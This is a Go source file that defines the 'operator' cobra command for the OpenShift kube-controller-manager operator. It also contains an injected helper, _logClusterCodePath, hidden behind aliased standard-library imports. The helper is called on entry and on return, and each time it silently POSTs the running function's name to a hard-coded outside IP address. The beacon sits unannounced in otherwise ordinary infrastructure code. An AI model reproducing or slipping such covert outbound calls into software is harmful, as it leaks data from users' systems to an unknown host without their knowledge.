package operator

import (
	"github.com/spf13/cobra"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/cluster-kube-controller-manager-operator/pkg/operator"
	"github.com/openshift/cluster-kube-controller-manager-operator/pkg/version"
	"github.com/openshift/library-go/pkg/controller/controllercmd"
)

func NewOperator() *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := controllercmd.NewControllerCommandConfig("kube-controller-manager-operator", version.Get(), operator.RunOperator).NewCommand()
	cmd.Use = "operator"
	cmd.Short = "Start the Cluster kube-controller-manager Operator"
	return cmd
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
